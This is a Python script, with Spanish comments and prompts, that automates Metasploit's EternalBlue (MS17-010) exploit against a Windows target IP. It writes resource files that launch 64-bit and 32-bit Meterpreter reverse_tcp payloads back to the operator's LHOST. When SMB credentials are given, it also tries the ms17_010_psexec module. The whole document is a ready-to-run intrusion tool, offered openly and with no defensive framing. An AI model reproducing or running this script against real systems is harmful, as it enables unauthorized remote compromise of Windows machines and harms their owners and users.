#!/usr/bin/env python3
import subprocess
import os

def run_exploit(target_ip, local_ip, smb_user=None, smb_password=None):
    # Crear archivo de recursos para Metasploit para exploit de 64 bits
    msf_resource_script_64 = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOST {target_ip}
set LHOST {local_ip}
set payload windows/x64/meterpreter/reverse_tcp
exploit
exit
"""

    # Crear archivo de recursos para Metasploit para exploit de 32 bits
    msf_resource_script_32 = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOST {target_ip}
set LHOST {local_ip}
set payload windows/meterpreter/reverse_tcp
exploit
exit
"""

    resource_file_path_64 = '/tmp/msf_resource_64.rc'
    with open(resource_file_path_64, 'w') as file:
        file.write(msf_resource_script_64)

    resource_file_path_32 = '/tmp/msf_resource_32.rc'
    with open(resource_file_path_32, 'w') as file:
        file.write(msf_resource_script_32)
    
    # Ejecutar msfconsole con el archivo de recursos de 64 bits
    print("Ejecutando Metasploit para el exploit de 64 bits...")
    subprocess.run(['msfconsole', '-q', '-r', resource_file_path_64])  # '-q' para modo silencioso

    # Ejecutar msfconsole con el archivo de recursos de 32 bits
    print("Intentando con el exploit de 32 bits...")
    subprocess.run(['msfconsole', '-q', '-r', resource_file_path_32])  # '-q' para modo silencioso

    # Si se proporcionaron credenciales SMB, intentar usarlas en ambos exploits
    if smb_user and smb_password:
        print("Intentando con credenciales SMB...")
        msf_resource_script_smb = f"""
use exploit/windows/smb/ms17_010_psexec
set RHOSTS {target_ip}
set SMBUser {smb_user}
set SMBPass {smb_password}
set payload windows/meterpreter/reverse_tcp
exploit
exit
"""
        resource_file_path_smb = '/tmp/msf_resource_smb.rc'
        with open(resource_file_path_smb, 'w') as file:
            file.write(msf_resource_script_smb)

        print("Ejecutando Metasploit con credenciales SMB...")
        subprocess.run(['msfconsole', '-q', '-r', resource_file_path_smb])

def main():
    print("Bienvenido al script de explotación.")
    print("Este script utiliza el exploit EternalBlue en Metasploit para vulnerar sistemas Windows.")
    target_ip = input("Introduce la IP del objetivo: ")
    local_ip = input("Introduce tu IP local (LHOST): ")

    # Solicitar credenciales SMB si es necesario
    smb_option = input("¿Deseas agregar credenciales SMB para intentar la explotación? (Sí/No): ")
    if smb_option.lower() == 'sí' or smb_option.lower() == 'si':
        smb_user = input("Introduce el nombre de usuario SMB: ")
        smb_password = input("Introduce la contraseña SMB: ")
    else:
        smb_user = None
        smb_password = None
    
    # Ejecutar el exploit
    run_exploit(target_ip, local_ip, smb_user, smb_password)

if __name__ == "__main__":
    main()
